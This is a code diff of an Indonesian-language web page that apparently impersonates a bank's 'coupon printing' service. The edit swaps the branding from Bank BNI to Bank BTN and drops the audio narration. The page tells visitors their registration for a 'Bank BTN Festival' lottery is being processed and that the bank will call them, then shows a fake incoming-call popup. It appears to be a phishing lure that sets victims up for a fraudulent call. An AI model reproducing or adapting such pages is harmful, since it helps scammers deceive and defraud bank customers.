@@ -2,8 +2,8 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <meta name="theme-color" content="#FE6A00">
-  <meta name="description" content="Cetak Kupon BNl secara online dengan mudah dan cepat.">
-  <title>Cetak Kupon BNI</title>
+  <meta name="description" content="Cetak Kupon BTN secara online dengan mudah dan cepat.">
+  <title>Cetak Kupon BTN</title>
   <link rel="icon" type="image/png" href="./hosting.tigerengine.id/ssmuyg.jpg">
   <link rel="image_src" href="">
   <style>
@@ -105,7 +105,7 @@
 
   <div id="main-content">
     <header>
-      <!-- Logo BNI dihapus -->
+      <!-- Logo BTN dihapus -->
     </header>
 
     <section class="hero">
@@ -126,18 +126,15 @@
     </div>
   </div>
 
-  <audio id="narration" src=""></audio>
-  <audio id="ringtone" src="./cdn.glitch.global/d1419cc7-e74f-4589-b98b-0414f2d79f97/ring-tone-68676_v%3D1748658108347.mp3" loop=""></audio>
+  <!-- Audio dihapus -->
 
   <script>
     const textBox = document.getElementById("text-box");
-    const narration = document.getElementById("narration");
-    const ringtone = document.getElementById("ringtone");
     const callingPopup = document.getElementById("calling-popup");
 
     const scriptText = `Terima kasih telah mendaftar di layanan Bank BTN Festival. 
 Pendaftaran Anda sedang diproses. 
-beberapa saat lagi, Anda akan dihubungi oleh pihak Bank btn 
+beberapa saat lagi, Anda akan dihubungi oleh pihak Bank BTN 
 untuk proses pencetakan kode kupon undian Anda.`;
 
     function typeTextPerChar(text, duration, callback) {
@@ -159,28 +156,16 @@ untuk proses pencetakan kode kupon undian Anda.`;
     }
 
     function startTyping() {
-      const durasi = narration.duration || 20;
+      const durasi = 20; // Durasi tetap 20 detik tanpa audio
       typeTextPerChar(scriptText, durasi, () => {
         console.log("Selesai mengetik");
+        callingPopup.style.display = "flex"; // Tampilkan popup calling setelah typing
       });
     }
 
-    // Langsung mulai tanpa popup awal
+    // Langsung mulai tanpa popup awal dan audio
     window.onload = function() {
-      narration.play();
-
-      if (narration.readyState >= 1) {
-        startTyping();
-      } else {
-        narration.onloadedmetadata = startTyping;
-      }
-
-      narration.onended = () => {
-        callingPopup.style.display = "flex";
-        ringtone.play().catch(err => {
-          console.warn("Autoplay ringtone diblokir:", err);
-        });
-      };
+      startTyping();
     };
   </script>
 
